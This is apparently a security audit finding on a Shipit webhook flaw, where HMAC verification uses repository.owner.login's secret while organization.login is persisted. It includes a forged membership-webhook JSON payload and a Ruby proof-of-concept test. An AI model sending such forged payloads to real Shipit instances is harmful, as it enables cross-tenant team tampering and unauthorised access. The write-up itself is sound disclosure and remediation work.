Both sides of the claimed equality were traced through code, not just described:

- `verify_signature`'s binding: `repository_owner = params.dig('repository','owner','login') || params.dig('organization','login')` [1](#0-0)  — used only to select which org's `webhook_secret` HMAC-validates the request via `Shipit.github(organization: repository_owner)` and `verify_webhook_signature` [2](#0-1) .
- `MembershipHandler`'s binding: `team.organization = params.organization.login` [3](#0-2)  — reads exclusively from the `organization.login` payload key, and indeed never touches `repository.full_name` (the `repository_name`/`stacks` helpers in the `Handler` base class are unused by `MembershipHandler`) [4](#0-3) .

These two reads are **not the same field**, and the controller never asserts `repository.owner.login == organization.login` before dispatching. That is the broken binding.

### Title
Signature verification org (`repository.owner.login`) diverges from the org persisted into `Team#organization` (`organization.login`) - ([File: app/controllers/shipit/webhooks_controller.rb])

### Summary
`WebhooksController#verify_signature` HMAC-validates a webhook against the secret of `repository.owner.login` (falling back to `organization.login` only if `repository` is absent), while `MembershipHandler#find_or_create_team!` unconditionally trusts `organization.login` to create/attach a `Team` record. An attacker who legitimately controls a GitHub org (and therefore its own webhook secret) can inject a synthetic `repository.owner.login` field pointing at their own org to pass signature verification, while setting `organization.login` to an arbitrary victim org name that the handler actually persists.

### Finding Description
Genuine GitHub `membership` webhook payloads never contain a top-level `repository` object — only `action`, `scope`, `member`, `sender`, `team`, `organization`. Nothing in `WebhooksController` or `MembershipHandler.params` (which only `requires :action, :team, :organization, :member` — no `repository`) [5](#0-4)  rejects an attacker-fabricated payload that adds an extraneous `repository` key. `ExplicitParameters::Parameters.define` only enforces declared required keys, and `Handler#initialize` just does `@params = self.class.param_parser.parse!(payload)` [6](#0-5)  — undeclared top-level keys pass through the raw `payload` untouched and unrejected.

Exploit request: `POST /webhooks` with header `X-Github-Event: membership`, `X-Hub-Signature` computed with the attacker's own known org secret, and body:
```json
{
  "action": "added",
  "team": {"id": 999999, "name": "x", "slug": "x", "url": "https://api.github.com/teams/999999"},
  "member": {"login": "attacker"},
  "organization": {"login": "victim-org"},
  "repository": {"owner": {"login": "attacker-org"}}
}
```
`repository_owner` evaluates `params.dig('repository','owner','login')` first, returning `"attacker-org"` [1](#0-0) , so `Shipit.github(organization: "attacker-org")` resolves to the attacker's own configured `webhook_secret`, which they know, so `verify_webhook_signature` passes [2](#0-1) , [7](#0-6) . Dispatch proceeds to `MembershipHandler`, whose `find_or_create_team!` creates/mutates a `Team` keyed by attacker-chosen `params.team.id` with `organization = "victim-org"` [3](#0-2) , then adds `member` (`"attacker"`, an arbitrary GitHub login of the attacker's choosing) into that team via `team.add_member(member)` [8](#0-7) . No check anywhere compares `repository.owner.login` to `organization.login`.

### Impact Explanation
This lets an attacker who controls any real GitHub org onboarded to this Shipit instance (and therefore knows that org's own `webhook_secret`) forge webhook authenticity for a `victim-org` they don't control, writing/mutating a `Team#organization = "victim-org"` record and inserting an arbitrary attacker-controlled GitHub login as a member of that team. This is a cross-tenant write: a request whose HMAC only proves control of `attacker-org`'s secret produces a database mutation attributed to `victim-org`. This matches the "payload for one repository/org mutating another's ... team" Critical category. Whether it further escalates into `Shipit.github_teams` authorization depends on how `Shipit.github_teams` config matches Team records by organization/slug — that downstream check could not be fully verified in this pass, but the team-mutation-across-tenant-boundary itself is the confirmed, in-scope finding.

### Likelihood Explanation
Preconditions: the attacker must own/administer at least one GitHub org that is configured in this Shipit instance with a known `webhook_secret` (i.e., a legitimately onboarded, unprivileged tenant org) — this is exactly the "any internet user who can send HTTP requests to the Shipit host" / owns their own GitHub org attacker profile allowed by the rules. No Shipit session, API token, or victim secret is required. The attack is a single crafted POST, fully repeatable against any `team.id`/`organization.login` value, and costs the attacker nothing beyond having their own onboarded org.

### Recommendation
In `WebhooksController#repository_owner`, do not silently prefer `repository.owner.login` when `organization.login` is also present and differs; either require they match when both exist, or select the identity field based on the actual event type's canonical schema (e.g., `membership`/`organization` events should only ever trust `organization.login`, never `repository.owner.login`). Additionally, `MembershipHandler` (and any handler) should verify that the org used for signature verification (`repository_owner`) equals the org value it persists, rejecting the webhook otherwise.

### Proof of Concept
```ruby
# test/controllers/webhooks_controller_test.rb
test "membership webhook with mismatched repository.owner.login and organization.login persists the organization.login value, verified only against repository.owner.login's secret" do
  attacker_org = "attacker-org"
  victim_org = "victim-org"
  Shipit.stubs(:github).with(organization: attacker_org).returns(stub(verify_webhook_signature: true))

  payload = {
    action: "added",
    team: { id: 4242, name: "x", slug: "x", url: "https://api.github.com/teams/4242" },
    member: { login: "attacker" },
    organization: { login: victim_org },
    repository: { owner: { login: attacker_org } }
  }.to_json

  post :create, body: payload, params: {}, headers: {
    'X-Github-Event' => 'membership',
    'X-Hub-Signature' => 'sha1=whatever-valid-for-attacker_org-secret'
  }

  assert_response :ok
  team = Team.find_by(github_id: 4242)
  refute_nil team
  assert_equal victim_org, team.organization # persisted org
  refute_equal attacker_org, team.organization # diverges from the org whose secret actually authenticated the HMAC
end
```

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L24-30)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L7-21)
```ruby
        params do
          requires :action, String
          requires :team do
            requires :id, Integer
            requires :name, String
            requires :slug, String
            requires :url, String
          end
          requires :organization do
            requires :login, String
          end
          requires :member do
            requires :login, String
          end
        end
```

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L22-28)
```ruby
        def process
          team = find_or_create_team!
          member = User.find_or_create_by_login!(params.member.login)

          case params.action
          when 'added'
            team.add_member(member)
```

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L38-42)
```ruby
        def find_or_create_team!
          Team.find_or_create_by!(github_id: params.team.id) do |team|
            team.github_team = params.team
            team.organization = params.organization.login
          end
```

**File:** app/models/shipit/webhooks/handlers/handler.rb (L21-24)
```ruby
        def initialize(payload)
          @payload = payload
          @params = self.class.param_parser.parse!(payload)
        end
```

**File:** app/models/shipit/webhooks/handlers/handler.rb (L32-38)
```ruby
        def stacks
          @stacks ||= Repository.from_github_repo_name(repository_name)&.stacks || Stack.none
        end

        def repository_name
          payload.dig('repository', 'full_name')
        end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```
